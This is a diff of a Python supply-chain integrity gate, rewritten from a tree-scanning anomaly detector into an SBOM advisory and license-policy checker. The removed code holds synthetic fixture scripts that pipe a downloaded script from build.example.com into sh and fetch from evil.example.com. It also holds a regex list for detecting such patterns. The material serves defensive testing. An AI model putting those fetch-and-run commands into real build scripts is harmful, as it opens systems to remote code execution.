@@ -1,381 +1,518 @@
+#!/usr/bin/env python3
 """
-F9 — Supply-Chain Integrity Gate
-CycloneDX-ish SBOM generation, dependency diffing, and anomaly scoring
-with a taint/risk heuristic for CI on a monorepo.
+F9 — Supply-Chain Integrity Gate.
+
+A deterministic, offline, standard-library-only gate whose SOURCE OF TRUTH is
+SBOM data:
+
+  1.  Parse CycloneDX or SPDX JSON SBOM imports into a normalized component list.
+  2.  Match component versions against an embedded advisory table using
+      range-aware version comparison (==, !=, <, <=, >, >=, comma = AND,
+      `||` = OR).
+  3.  Apply a license/policy gate per component (allowed / review / denied).
+  4.  Emit PASS / REVIEW / FAIL with traceable reasons and a JSON/Markdown
+      report under reports/ (gitignored).
+
+Everything is synthetic placeholders: fictional package names, *.example.com
+hosts, 192.0.2.x addresses. Intended ONLY for authorized use — see the README
+"IMPORTANT: Read before use." section.
 """
 
-import hashlib
+from __future__ import annotations
+
+import argparse
 import json
-import os
 import re
-import time
-import uuid
+import sys
 from datetime import datetime, timezone
-from typing import Any, Dict, List, Optional, Tuple
+from pathlib import Path
+
+FIXTURES_DIR = Path(__file__).resolve().parent.parent / "fixtures"
+
+SEVERITY_ORDER = ["CRITICAL", "HIGH", "MEDIUM", "LOW"]
 
 
-# ---------------------------------------------------------------------------
-# Sample file tree (embedded) used by the offline demo.  In production you
-# would scan a real repository path.
-# ---------------------------------------------------------------------------
+# --------------------------------------------------------------------------- #
+# Advisory table + policy (embedded; single source of truth in fixtures/).
+# --------------------------------------------------------------------------- #
+def _default_advisories():
+    try:
+        return json.loads((FIXTURES_DIR / "ADVISORIES.json").read_text(encoding="utf-8"))
+    except Exception:
+        return []
 
-SAMPLE_TREE = {
-    "app/": [
-        "main.py",
-        "requirements.txt",
-        "utils/__init__.py",
-        "utils/net.py",
-        "README.md",
-    ],
-    "scripts/": [
-        "prebuild.sh",
-        "configure.ac",
-        "build_stamp.sh",
-    ],
-    "vendor/": [
-        "libfoo.so",
-        "libfoo.so.1",
-        "libbar.a",
-    ],
-    "tests/": [
-        "test_app.py",
-    ],
+
+ADVISORIES = _default_advisories()
+
+LICENSE_POLICY = {
+    "allowed": ["MIT", "Apache-2.0", "BSD-3-Clause", "BSD-2-Clause",
+                "ISC", "Unlicense", "PSF-2.0", "0BSD", "MPL-2.0"],
+    "review": ["GPL-2.0-only", "GPL-3.0-only", "LGPL-2.1-only",
+               "AGPL-3.0-only", "EPL-2.0", "CDDL-1.0"],
+    "denied": ["Proprietary", "BUSL-1.1", "Commons-Clause", "CC-BY-NC-4.0"],
 }
 
-SAMPLE_FILE_CONTENTS = {
-    "app/requirements.txt": (
-        "flask==2.3.2\n"
-        "requests==2.31.0\n"
-        "cryptography==41.0.7\n"
-        "pyyaml==6.0.1\n"
-    ),
-    "app/main.py": (
-        "import flask\n"
-        "import requests\n"
-        "from utils.net import fetch\n"
-        "def main():\n"
-        "    print(fetch('https://example.com'))\n"
-    ),
-    "app/utils/net.py": (
-        "import requests\n"
-        "def fetch(url):\n"
-        "    return requests.get(url).text\n"
-    ),
-    "scripts/prebuild.sh": (
-        "#!/bin/sh\n"
-        "echo 'prebuild: fetch toolchain'\n"
-        "curl -fsSL http://build.example.com/toolchain.sh | sh\n"
-    ),
-    "scripts/configure.ac": (
-        "AC_INIT([demo],[1.0.0])\n"
-        "AC_PROG_CC\n"
-        "AC_CHECK_LIB([crypto],[EVP_Digest])\n"
-    ),
-    "app/README.md": "# Demo app\n",
-    "vendor/libfoo.so": b"\x7fELF" + b"\x00" * 64,
-    "vendor/libfoo.so.1": b"\x7fELF" + b"\x00" * 64,
-    "vendor/libbar.a": b"!<arch>\n" + b"\x00" * 32,
-    "tests/test_app.py": "import app.main\n",
+FIXTURES = {
+    "clean": FIXTURES_DIR / "sbom-clean.json",
+    "vulnerable": FIXTURES_DIR / "sbom-vulnerable.json",
+    "spdx-legacy": FIXTURES_DIR / "sbom-spdx-legacy.json",
 }
 
-# After-commit tree represents a change: a new maintainer script and a
-# new/unexpected binary appear; a dependency version bumps.
-SAMPLE_TREE_AFTER = {
-    "app/": [
-        "main.py",
-        "requirements.txt",
-        "utils/__init__.py",
-        "utils/net.py",
-        "README.md",
-    ],
-    "scripts/": [
-        "prebuild.sh",
-        "configure.ac",
-        "build_stamp.sh",
-        "install_hook.sh",
-    ],
-    "vendor/": [
-        "libfoo.so",
-        "libfoo.so.1",
-        "libbar.a",
-        "libssh.so.9",
-    ],
-    "tests/": [
-        "test_app.py",
-    ],
-}
 
-SAMPLE_FILE_CONTENTS_AFTER = {
-    "app/requirements.txt": (
-        "flask==2.3.2\n"
-        "requests==2.31.0\n"
-        "cryptography==42.0.0\n"
-        "pyyaml==6.0.1\n"
-    ),
-    "scripts/install_hook.sh": (
-        "#!/bin/sh\n"
-        "echo 'installing hook'\n"
-        "curl -fsSL http://build.example.com/hook.sh | sh\n"
-        "python3 -c 'import urllib; print(urllib.request.urlopen("
-        "\"http://evil.example.com/x\").read())'"
-    ),
-    "vendor/libssh.so.9": b"\x7fELF" + b"\x90" * 64,
-}
-
-PACKAGE_FILE_NAMES = {"requirements.txt", "package.json", "cargo.lock",
-                      "go.mod", "Pipfile", "setup.cfg"}
+# --------------------------------------------------------------------------- #
+# Version comparison (stdlib-only; a tiny PEP-440-ish subset).
+# --------------------------------------------------------------------------- #
+def _split_version(version: str) -> tuple:
+    core = version.strip().split("+", 1)[0].split("-", 1)[0]
+    parts = []
+    for token in core.split("."):
+        token = token.strip()
+        parts.append(int(token) if token.isdigit() else 0)
+    while len(parts) < 3:
+        parts.append(0)
+    return tuple(parts[:3])
 
 
-# ---------------------------------------------------------------------------
-# 1. CycloneDX-ish SBOM generation
-# ---------------------------------------------------------------------------
-
-def _hash_bytes(data: bytes) -> str:
-    return hashlib.sha256(data).hexdigest()
+def _cmp_versions(v1: str, v2: str) -> int:
+    a = _split_version(v1)
+    b = _split_version(v2)
+    return (a > b) - (a < b)
 
 
-def _is_binary(data: bytes) -> bool:
-    """Heuristic: presence of NUL byte or ELF/ar magic."""
-    if data.startswith(b"\x7fELF"):
+def _constraint_match(version: str, op: str, target: str) -> bool:
+    c = _cmp_versions(version, target)
+    if op == "==":
+        return c == 0
+    if op == "!=":
+        return c != 0
+    if op == "<":
+        return c < 0
+    if op == "<=":
+        return c <= 0
+    if op == ">":
+        return c > 0
+    if op == ">=":
+        return c >= 0
+    return False
+
+
+def match_constraints(version: str, spec: str) -> bool:
+    """True when `version` satisfies an advisory `affected` spec.
+
+    Grammar subset: empty/`*` matches everything; `||` separates OR groups;
+    a comma inside a group means AND; each item is `op version` with op in
+    ==, !=, <, <=, >, >=.
+    """
+    spec = (spec or "").strip()
+    if not spec or spec == "*":
         return True
-    if data.startswith(b"!<arch>"):
-        return True
-    return b"\x00" in data[:512]
-
-
-def _parse_requirements(text: str) -> List[Dict]:
-    deps = []
-    for line in text.splitlines():
-        line = line.strip()
-        if not line or line.startswith("#") or line.startswith("-"):
-            continue
-        m = re.match(r"([A-Za-z0-9_\-\.]+)\s*(==|>=|<=|~=|!=)?\s*([\d\.\w]+)?", line)
-        if not m:
-            continue
-        name = m.group(1)
-        version = m.group(3) or "*"
-        deps.append({"name": name, "version": version, "type": "pypi"})
-    return deps
-
-
-def _parse_imports(source: str) -> List[str]:
-    imports = []
-    for line in source.splitlines():
-        line = line.strip()
-        m = re.match(r"^(?:from\s+([A-Za-z0-9_]+)\s+import|import\s+([A-Za-z0-9_]+))", line)
-        if m:
-            name = m.group(1) or m.group(2)
-            if name not in imports:
-                imports.append(name)
-    return imports
-
-
-def generate_sbom(files: Dict[str, Any], spec: Dict[str, List[str]]) -> Dict:
-    """Generate a CycloneDX-ish SBOM (JSON) from a scanned tree."""
-    components = []
-    for dir_name, filenames in spec.items():
-        for fname in filenames:
-            path = os.path.join(dir_name, fname)
-            raw = files.get(path, b"")
-            data = raw if isinstance(raw, bytes) else raw.encode("utf-8", "replace")
-            comp = {
-                "type": "library",
-                "name": path,
-                "bom-ref": uuid.uuid4().hex[:12],
-                "hashes": [{"alg": "SHA-256", "content": _hash_bytes(data)}],
-                "properties": [],
-            }
-            if _is_binary(data):
-                comp["properties"].append({"name": "kind", "value": "binary"})
-            if fname in PACKAGE_FILE_NAMES and isinstance(raw, str):
-                comp["properties"].append({"name": "package-file", "value": "true"})
-                comp["dependencies"] = _parse_requirements(raw)
-            components.append(comp)
-
-    sbom = {
-        "bomFormat": "CycloneDX",
-        "specVersion": "1.4",
-        "serialNumber": "urn:uuid:" + uuid.uuid4().hex,
-        "version": 1,
-        "metadata": {
-            "timestamp": datetime.now(timezone.utc).isoformat(),
-            "tools": [{"vendor": "F9", "name": "supply_chain_gate",
-                       "version": "1.0.0"}],
-        },
-        "components": components,
-    }
-    return sbom
-
-
-# ---------------------------------------------------------------------------
-# 2. Dependency tree diff
-# ---------------------------------------------------------------------------
-
-def _index_dependencies(bom: Dict) -> Dict[str, str]:
-    """Map component name -> version for package files."""
-    deps = {}
-    for comp in bom["components"]:
-        props = {p["name"]: p["value"] for p in comp.get("properties", [])}
-        if props.get("package-file") == "true":
-            for d in comp.get("dependencies", []):
-                deps[d["name"]] = d["version"]
-    return deps
-
-
-def diff_dependency_trees(before_bom: Dict, after_bom: Dict) -> Dict:
-    """Diff dependency trees between two commits (embedded before/after SBOMs)."""
-    before = _index_dependencies(before_bom)
-    after = _index_dependencies(after_bom)
-    added = {k: v for k, v in after.items() if k not in before}
-    removed = {k: v for k, v in before.items() if k not in after}
-    changed = {k: (before[k], after[k]) for k in before
-               if k in after and before[k] != after[k]}
-    return {"added": added, "removed": removed, "changed": changed}
-
-
-# ---------------------------------------------------------------------------
-# 3. Anomaly detection + taint/risk heuristic
-# ---------------------------------------------------------------------------
-
-def detect_anomalies(before_spec: Dict[str, List[str]],
-                     after_spec: Dict[str, List[str]],
-                     files: Dict[str, Any]) -> List[Dict]:
-    """Flag new/unexpected maintainer scripts, configure.ac-like changes,
-    and unusual binaries.  Score each with a taint/risk heuristic."""
-    anomalies = []
-
-    before_files = set(
-        os.path.join(d, f) for d, fs in before_spec.items() for f in fs
-    )
-    after_files = set(
-        os.path.join(d, f) for d, fs in after_spec.items() for f in fs
-    )
-    new_files = after_files - before_files
-
-    for path in sorted(new_files):
-        raw = files.get(path, b"")
-        if path.endswith(".sh"):
-            score = 8.0
-            source = raw if isinstance(raw, str) else raw.decode("utf-8", "replace")
-            suspicious = [r"curl.*\|\s*sh", r"curl.*\|sh", r"wget.*\|\s*sh",
-                          r"urlopen", r"eval\(", r"base64", r"chmod\s+\+x"]
-            reasons = []
-            for pat in suspicious:
-                if re.search(pat, source, re.IGNORECASE):
-                    reasons.append(f"matches pattern {pat!r}")
-                    score += 1.5
-            anomalies.append({
-                "path": path,
-                "kind": "new-maintainer-script",
-                "risk_score": round(min(score, 10.0), 1),
-                "severity": "HIGH" if score >= 8 else "MEDIUM",
-                "detail": "; ".join(reasons) if reasons else "new shell script",
-            })
-        elif path == "scripts/configure.ac" or path.endswith(".ac"):
-            anomalies.append({
-                "path": path,
-                "kind": "configure-ac-change",
-                "risk_score": 7.0,
-                "severity": "MEDIUM",
-                "detail": "autotools configure.ac change — build-code churn",
-            })
-        else:
-            data = raw if isinstance(raw, bytes) else str(raw).encode()
-            if _is_binary(data):
-                anomalies.append({
-                    "path": path,
-                    "kind": "new-binary",
-                    "risk_score": 7.5,
-                    "severity": "HIGH",
-                    "detail": f"unexpected binary ({len(data)} bytes, "
-                              f"sha256={_hash_bytes(data)[:12]})",
-                })
-
-    # Changed package versions
-    for path in sorted(after_files):
-        if os.path.basename(path) in PACKAGE_FILE_NAMES and path in before_files:
-            b_raw = files.get("__before__", {}).get(path) if isinstance(
-                files.get("__before__"), dict) else None
-            a_raw = files.get(path)
-            if b_raw is None or a_raw is None:
+    for group in spec.split("||"):
+        ok = True
+        for item in group.split(","):
+            item = item.strip()
+            if not item or item == "*":
                 continue
-            b_deps = {d["name"]: d["version"] for d in _parse_requirements(b_raw)}
-            a_deps = {d["name"]: d["version"] for d in _parse_requirements(a_raw)}
-            for name, vers in a_deps.items():
-                if name in b_deps and b_deps[name] != vers:
-                    anomalies.append({
-                        "path": path,
-                        "kind": "dependency-version-bump",
-                        "risk_score": 4.0,
-                        "severity": "LOW",
-                        "detail": f"{name}: {b_deps[name]} -> {vers}",
-                    })
-
-    return anomalies
+            m = re.match(r"^(<=|>=|==|!=|<|>)\s*(\S+)$", item)
+            if not m:
+                continue
+            if not _constraint_match(version, m.group(1), m.group(2)):
+                ok = False
+                break
+        if ok:
+            return True
+    return False
 
 
-def compute_gate_badge(anomalies: List[Dict]) -> Tuple[str, str]:
-    """Return (color, label) green/red badge."""
-    high = [a for a in anomalies if a["severity"] == "HIGH"]
-    if high:
-        return ("red", "FAIL")
-    if len(anomalies) >= 3:
-        return ("orange", "REVIEW")
-    return ("green", "PASS")
+# --------------------------------------------------------------------------- #
+# SBOM parsing (CycloneDX + SPDX JSON).
+# --------------------------------------------------------------------------- #
+def parse_sbom(data: dict) -> dict:
+    """Normalize a CycloneDX or SPDX JSON document into a component list."""
+    if data.get("bomFormat") == "CycloneDX":
+        components = []
+        for c in data.get("components", []) or []:
+            licenses = []
+            for lic in c.get("licenses", []) or []:
+                if isinstance(lic, str):
+                    licenses.append(lic)
+                elif isinstance(lic, dict):
+                    inner = lic.get("license") or lic.get("expression")
+                    if isinstance(inner, dict):
+                        lid = inner.get("id") or inner.get("name")
+                        if lid:
+                            licenses.append(str(lid).strip())
+                    elif isinstance(inner, str) and inner.strip():
+                        licenses.append(inner.strip())
+            components.append({
+                "name": str(c.get("name", "") or ""),
+                "version": str(c.get("version", "") or ""),
+                "type": str(c.get("type", "library")),
+                "ref": c.get("bom-ref") or c.get("purl") or "",
+                "licenses": licenses,
+                "hashes": [str(h.get("content", ""))
+                           for h in (c.get("hashes") or [])],
+            })
+        return {"bom_format": "CycloneDX", "components": components}
+
+    if str(data.get("spdxVersion", "")).startswith("SPDX-"):
+        components = []
+        for p in data.get("packages", []) or []:
+            lic = p.get("licenseConcluded") or p.get("licenseDeclared") or ""
+            components.append({
+                "name": str(p.get("name", "") or ""),
+                "version": str(p.get("versionInfo", "") or ""),
+                "type": "package",
+                "ref": p.get("SPDXID", "") or p.get("name", "") or "",
+                "licenses": [lic.strip()] if lic.strip() else [],
+                "hashes": [],
+            })
+        return {"bom_format": "SPDX", "components": components}
+
+    raise ValueError("unrecognized SBOM format (expected CycloneDX or SPDX JSON)")
 
 
-# ---------------------------------------------------------------------------
-# 4. Main offline demo
-# ---------------------------------------------------------------------------
+def load_sbom(path) -> dict:
+    data = json.loads(Path(path).read_text(encoding="utf-8"))
+    return parse_sbom(data)
 
-def main():
-    print("=" * 70)
-    print("  F9 — Supply-Chain Integrity Gate — Offline Demo")
-    print("=" * 70)
 
-    # Resolve before/after trees with proper extra files
-    before_files = dict(SAMPLE_FILE_CONTENTS)
-    after_files = dict(SAMPLE_FILE_CONTENTS)
-    after_files.update(SAMPLE_FILE_CONTENTS_AFTER)
+# --------------------------------------------------------------------------- #
+# Advisory matching.
+# --------------------------------------------------------------------------- #
+def _component_versions(sbom: dict) -> dict:
+    out = {}
+    for comp in sbom["components"]:
+        out.setdefault(comp["name"], []).append(comp["version"])
+    return out
 
-    # SBOM for before & after commits
-    print("\n[1] Generate CycloneDX-ish SBOM (before commit)")
-    bom_before = generate_sbom(before_files, SAMPLE_TREE)
-    print(f"    Serial : {bom_before['serialNumber']}")
-    print(f"    Components : {len(bom_before['components'])}")
-    print("\n    SBOM (JSON) sample:")
-    print("    " + json.dumps(bom_before, indent=2).replace("\n", "\n    ")[:1200])
 
-    print("\n[2] Generate SBOM (after commit)")
-    bom_after = generate_sbom(after_files, SAMPLE_TREE_AFTER)
-    print(f"    Components : {len(bom_after['components'])}")
+def check_advisories(sbom: dict, advisories: list = None) -> list:
+    advisories = ADVISORIES if advisories is None else advisories
+    versions = _component_versions(sbom)
+    findings = []
+    for adv in advisories:
+        package = adv.get("package")
+        for version in versions.get(package, []) or [""]:
+            if version and match_constraints(version, adv.get("affected", "*")):
+                findings.append({
+                    "advisory": adv.get("id", "ADV-?"),
+                    "package": package,
+                    "version": version,
+                    "affected": adv.get("affected", "*"),
+                    "severity": adv.get("severity", "MEDIUM"),
+                    "summary": adv.get("advisory", ""),
+                })
+    findings.sort(key=lambda f: (
+        SEVERITY_ORDER.index(f["severity"])
+        if f["severity"] in SEVERITY_ORDER else 99))
+    return findings
 
-    # Dependency diff
-    print("\n[3] Dependency Diff (before -> after)")
-    diff = diff_dependency_trees(bom_before, bom_after)
-    print(f"    Added   : {diff['added']}")
-    print(f"    Removed : {diff['removed']}")
-    print(f"    Changed : {diff['changed']}")
 
-    # Anomaly detection
-    print("\n[4] Anomaly Detection + Risk Scoring")
-    files_for_detect = dict(after_files)
-    files_for_detect["__before__"] = before_files
-    anomalies = detect_anomalies(SAMPLE_TREE, SAMPLE_TREE_AFTER, files_for_detect)
-    for a in anomalies:
-        print(f"    [{a['severity']:<6}] {a['kind']:<26} score={a['risk_score']:<5} {a['path']}")
-        print(f"              > {a['detail']}")
+# --------------------------------------------------------------------------- #
+# License / policy gate.
+# --------------------------------------------------------------------------- #
+def classify_license(lic: str, policy: dict = None) -> tuple:
+    policy = LICENSE_POLICY if policy is None else policy
+    lic = (lic or "").strip()
+    if not lic:
+        return ("REVIEW", "no license metadata declared")
+    lu = lic.upper()
+    if lu in ("NOASSERTION", "NONE"):
+        return ("REVIEW", "no license declared (%s) - needs human sign-off" % lic)
+    if lu in {x.upper() for x in policy["denied"]}:
+        return ("FAIL", "license denied by policy: %s" % lic)
+    if lu in {x.upper() for x in policy["review"]}:
+        return ("REVIEW", "reciprocal/copyleft license needs sign-off: %s" % lic)
+    if lu in {x.upper() for x in policy["allowed"]}:
+        return ("PASS", "allowed license: %s" % lic)
+    return ("REVIEW", "unclassified license: %s" % lic)
 
-    # Gate badge
-    color, label = compute_gate_badge(anomalies)
-    print(f"\n[5] Build Gate Badge")
-    print(f"    Gate status: {label} (color={color})")
 
-    print("\n" + "=" * 70)
-    print("  All modules exercised. Demo complete.")
-    print("=" * 70)
+def evaluate_license_policy(sbom: dict, policy: dict = None) -> list:
+    entries = []
+    for comp in sbom["components"]:
+        name = comp["name"]
+        lic_list = comp["licenses"]
+        if not lic_list:
+            entries.append({
+                "package": name, "version": comp["version"], "licenses": [],
+                "verdict": "REVIEW",
+                "reason": "no license metadata declared - needs human sign-off",
+            })
+            continue
+        decisions = [classify_license(l, policy) for l in lic_list]
+        if any(v == "FAIL" for v, _ in decisions):
+            overall = "FAIL"
+        elif any(v == "REVIEW" for v, _ in decisions):
+            overall = "REVIEW"
+        else:
+            overall = "PASS"
+        entries.append({
+            "package": name, "version": comp["version"], "licenses": lic_list,
+            "verdict": overall,
+            "reason": "; ".join(r for _, r in decisions),
+        })
+    return entries
+
+
+# --------------------------------------------------------------------------- #
+# Gate verdict.
+# --------------------------------------------------------------------------- #
+def compute_gate(sbom: dict, advisories: list = None, policy: dict = None) -> dict:
+    findings = check_advisories(sbom, advisories)
+    licenses = evaluate_license_policy(sbom, policy)
+
+    failures, reviews = [], []
+    for f in findings:
+        rec = {"kind": "advisory", "id": f["advisory"], "package": f["package"],
+               "version": f["version"], "severity": f["severity"],
+               "detail": f["summary"] or f["affected"]}
+        (failures if f["severity"] in ("CRITICAL", "HIGH") else reviews).append(rec)
+    for lr in licenses:
+        rec = {"kind": "license", "package": lr["package"],
+               "version": lr["version"], "severity": lr["verdict"],
+               "detail": lr["reason"]}
+        if lr["verdict"] == "FAIL":
+            failures.append(rec)
+        elif lr["verdict"] == "REVIEW":
+            reviews.append(rec)
+
+    if failures:
+        verdict, color = "FAIL", "red"
+    elif reviews:
+        verdict, color = "REVIEW", "orange"
+    else:
+        verdict, color = "PASS", "green"
+
+    reasons = ["FAIL  %-8s %s %s: %s" %
+               (r["severity"], r["package"], r.get("version", ""), r["detail"])
+               for r in failures]
+    reasons += ["REVIEW %-8s %s %s: %s" %
+                (r["severity"], r["package"], r.get("version", ""), r["detail"])
+                for r in reviews]
+
+    return {
+        "verdict": verdict,
+        "color": color,
+        "components": len(sbom["components"]),
+        "findings": findings,
+        "licenses": licenses,
+        "reasons": reasons,
+        "summary": {
+            "failures": len(failures),
+            "reviews": len(reviews),
+            "advisory_findings": len(findings),
+            "license_fail": sum(1 for lr in licenses if lr["verdict"] == "FAIL"),
+            "license_review": sum(1 for lr in licenses if lr["verdict"] == "REVIEW"),
+        },
+    }
+
+
+# --------------------------------------------------------------------------- #
+# Reporting.
+# --------------------------------------------------------------------------- #
+def _now() -> str:
+    return datetime.now(timezone.utc).isoformat(timespec="seconds")
+
+
+def _append_result(md: list, result: dict) -> None:
+    md.append("## %s (%s)" % (result["source"], result["bom_format"]))
+    md.append("")
+    md.append("- Components : %d" % result["components"])
+    md.append("- Gate       : **%s** (%s)" % (result["verdict"], result["color"]))
+    md.append("")
+    if result["findings"]:
+        md.append("| Advisory | Package | Version | Severity |")
+        md.append("|---|---|---|---|")
+        for f in result["findings"]:
+            md.append("| %s | %s | %s | %s |"
+                      % (f["advisory"], f["package"], f["version"], f["severity"]))
+        md.append("")
+    if result["licenses"]:
+        md.append("| Package | Version | Licenses | Verdict |")
+        md.append("|---|---|---|---|")
+        for lr in result["licenses"]:
+            md.append("| %s | %s | %s | %s |"
+                      % (lr["package"], lr["version"], ", ".join(lr["licenses"]),
+                         lr["verdict"]))
+        md.append("")
+    if result["reasons"]:
+        md.append("**Reasons**")
+        md.append("")
+        for r in result["reasons"]:
+            md.append("- %s" % r)
+        md.append("")
+
+
+def render_markdown(result: dict) -> str:
+    md = ["# F9 — Supply-Chain Integrity Gate report", "",
+          "Generated: %s" % result.get("generated", _now()), ""]
+    if "fixtures" in result:
+        md.append("## Demo mode — all bundled fixtures")
+        md.append("")
+        for fx in result["fixtures"]:
+            _append_result(md, fx)
+        md.append("## Summary")
+        md.append("")
+        for row in result["summary"]:
+            md.append("- %-16s %s" % (row, result["summary"][row]))
+        md.append("")
+    else:
+        _append_result(md, result)
+    return "\n".join(md)
+
+
+def render_json(result: dict) -> str:
+    return json.dumps(result, indent=2)
+
+
+def _write_report(path, result: dict) -> Path:
+    out = Path(path)
+    out.parent.mkdir(parents=True, exist_ok=True)
+    if out.suffix == ".json":
+        out.write_text(render_json(result), encoding="utf-8")
+    else:
+        out.write_text(render_markdown(result), encoding="utf-8")
+    return out
+
+
+def _format_text(result: dict) -> str:
+    lines = ["=" * 62,
+             "  F9 - SUPPLY-CHAIN INTEGRITY GATE",
+             "=" * 62,
+             "  Source      : %s" % result["source"],
+             "  BOM format  : %s" % result["bom_format"],
+             "  Components  : %d" % result["components"],
+             "  Gate        : %s (%s)" % (result["verdict"], result["color"]),
+             ""]
+    for r in result["reasons"]:
+        lines.append("    - %s" % r)
+    lines.append("")
+    lines.append("  See %s" % result.get("report", "reports/report.md"))
+    return "\n".join(lines)
+
+
+# --------------------------------------------------------------------------- #
+# Demo (offline; bundled fixtures only, always exits 0).
+# --------------------------------------------------------------------------- #
+def run_demo(report_path="reports/report.md", advisories=None, verbose=False) -> int:
+    advisories = ADVISORIES if advisories is None else advisories
+    print("=" * 62)
+    print("  F9 - Supply-Chain Integrity Gate - OFFLINE DEMO")
+    print("  Source of truth: CycloneDX/SPDX SBOM fixtures vs embedded advisory")
+    print("  table + license policy. All data is synthetic.")
+    print("=" * 62)
+
+    fixtures = []
+    for name, path in FIXTURES.items():
+        sbom = load_sbom(path)
+        res = compute_gate(sbom, advisories)
+        res["source"] = "fixture:%s" % name
+        res["bom_format"] = sbom["bom_format"]
+        res["generated"] = _now()
+        fixtures.append(res)
+        print("\n[%s]  %s (%s)  ->  %-6s (%s)   components=%d"
+              % (name.upper(), path.name, res["bom_format"], res["verdict"],
+                 res["color"], res["components"]))
+        for r in res["reasons"]:
+            print("      %s" % r)
+
+    summary = {"fixtures": len(fixtures),
+               "pass": sum(1 for f in fixtures if f["verdict"] == "PASS"),
+               "review": sum(1 for f in fixtures if f["verdict"] == "REVIEW"),
+               "fail": sum(1 for f in fixtures if f["verdict"] == "FAIL")}
+    combined = {"tool": "f9-supply-chain-gate", "mode": "demo",
+                "generated": _now(), "fixtures": fixtures, "summary": summary}
+
+    out = _write_report(report_path, combined)
+    print("\n" + "=" * 62)
+    print("  Demo complete. Report: %s" % out)
+    print("  PASS=%d  REVIEW=%d  FAIL=%d  (exit 0)"
+          % (summary["pass"], summary["review"], summary["fail"]))
+    print("=" * 62)
+    return 0
+
+
+# --------------------------------------------------------------------------- #
+# CLI.
+# --------------------------------------------------------------------------- #
+def main(argv=None) -> int:
+    ap = argparse.ArgumentParser(
+        prog="f9-supply-chain-gate",
+        description="Supply-chain integrity gate: parse CycloneDX/SPDX SBOMs, "
+                    "match dependencies against an embedded advisory table, and "
+                    "apply a license/policy gate -> PASS / REVIEW / FAIL.",
+    )
+    ap.add_argument("--sbom", default=None,
+                    help="path to a CycloneDX or SPDX JSON SBOM (overrides fixture)")
+    ap.add_argument("--fixture", choices=sorted(FIXTURES), default=None,
+                    help="embedded fixture to evaluate (clean / vulnerable / spdx-legacy)")
+    ap.add_argument("--advisories", default=None,
+                    help="override advisory table (JSON list of advisories)")
+    ap.add_argument("--demo", action="store_true",
+                    help="run the offline demo across all bundled fixtures")
+    ap.add_argument("--config", default="config.json",
+                    help="config JSON (default: config.json)")
+    ap.add_argument("--report", default="reports/report.md",
+                    help="output report path; .json selects JSON format")
+    ap.add_argument("--strict", action="store_true",
+                    help="exit 1 when the gate verdict is not PASS")
+    ap.add_argument("--verbose", "-v", action="store_true")
+    args = ap.parse_args(argv)
+
+    cfg = {}
+    cfg_path = Path(args.config)
+    if cfg_path.exists():
+        try:
+            cfg = json.loads(cfg_path.read_text(encoding="utf-8"))
+        except json.JSONDecodeError:
+            print("[config] parse error in %s" % cfg_path, file=sys.stderr)
+            return 2
+
+    advisories = ADVISORIES
+    adv_path = args.advisories or cfg.get("advisories_file")
+    if adv_path:
+        try:
+            advisories = json.loads(Path(adv_path).read_text(encoding="utf-8"))
+        except Exception as exc:  # noqa: BLE001
+            print("[advisories] cannot load %s: %s" % (adv_path, exc),
+                  file=sys.stderr)
+            return 2
+
+    demo = args.demo or (args.sbom is None and args.fixture is None)
+    if demo:
+        return run_demo(args.report, advisories, args.verbose)
+
+    if args.sbom:
+        sbom_path = Path(args.sbom)
+        source = args.sbom
+    else:
+        name = args.fixture or cfg.get("default_fixture") or "clean"
+        if name not in FIXTURES:
+            print("[sbom] unknown fixture: %s (choose from %s)"
+                  % (name, ", ".join(sorted(FIXTURES))), file=sys.stderr)
+            return 2
+        sbom_path = FIXTURES[name]
+        source = "fixture:%s" % name
+
+    try:
+        sbom = load_sbom(sbom_path)
+    except Exception as exc:  # noqa: BLE001
+        print("[sbom] cannot load %s: %s" % (sbom_path, exc), file=sys.stderr)
+        return 2
+
+    result = compute_gate(sbom, advisories)
+    result["source"] = source
+    result["bom_format"] = sbom["bom_format"]
+    result["generated"] = _now()
+    result["report"] = args.report
+    _write_report(args.report, result)
+    print(_format_text(result))
+
+    if result["verdict"] != "PASS" and args.strict:
+        return 1
     return 0
 
 
 if __name__ == "__main__":
-    raise SystemExit(main())
+    sys.exit(main())
